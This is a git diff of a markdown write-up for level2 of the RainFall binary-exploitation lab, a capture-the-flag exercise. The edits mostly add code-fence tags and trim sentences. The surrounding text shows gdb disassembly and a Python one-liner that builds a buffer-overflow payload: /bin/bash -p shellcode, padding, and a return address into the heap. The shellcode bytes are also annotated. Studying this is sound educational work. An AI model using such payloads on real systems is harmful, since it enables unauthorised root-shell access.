@@ -2,7 +2,7 @@
 
 This level greets us with a similar setup as the previous one if we look at the binary:
 
-```
+```bash
 level2@RainFall:~$ gdb -batch ./level2 -ex 'disassemble main'
 Dump of assembler code for function main:
    0x0804853f <+0>:	    push   %ebp
@@ -14,9 +14,9 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
-We can see that the `main` function is similar, except that it calls a function `p`. Let's look at that function:
+Let's look at that function `p`:
 
-```
+```bash
 level2@RainFall:~$ gdb -batch ./level2 -ex 'disassemble p'
 Dump of assembler code for function p:
    0x080484d4 <+0>:	    push   %ebp
@@ -66,8 +66,6 @@ level2@RainFall:~$ objdump -d level2 | grep '@plt'
  8048538:	e8 a3 fe ff ff       	call   80483e0 <strdup@plt>
 ```
 
-This excludes the possibility of using a `RET2LIBC` attack. But this does not mean that we cannot exploit the binary or the `gets` call, we'll just have to use a different approach.
-
 ##  PLT vs. GOT
 
 Before we continue, we need to explain what the Procedure Linkage Table (PLT) and Global Offset Table (GOT) are.
@@ -86,7 +84,7 @@ Since the address range for the heap, the lower addresses, is not filtered out, 
 
 Consider the following instructions:
 
-```
+```bash
 python -c 'import struct; shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"; print(shellcode + "A"*(80-len(shellcode)) + struct.pack("<I", 0x804a008))' > /tmp/payload
 ```
 
@@ -97,7 +95,7 @@ python -c 'import struct; shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\
 66 68 2d 70     push word 0x702d  ; "-p"
 89 e1           mov ecx, esp      ; ecx pointe vers "-p"
 52              push edx          ; NULL
-6a 68           push byte 0x68    ; 'h'
+6a 68           push byte 0x68    ; "h"
 68 2f 62 61 73  push 0x7361622f   ; "/bas"
 68 2f 62 69 6e  push 0x6e69622f   ; "/bin"
 89 e3           mov ebx, esp      ; ebx pointe vers "/bin/bash"
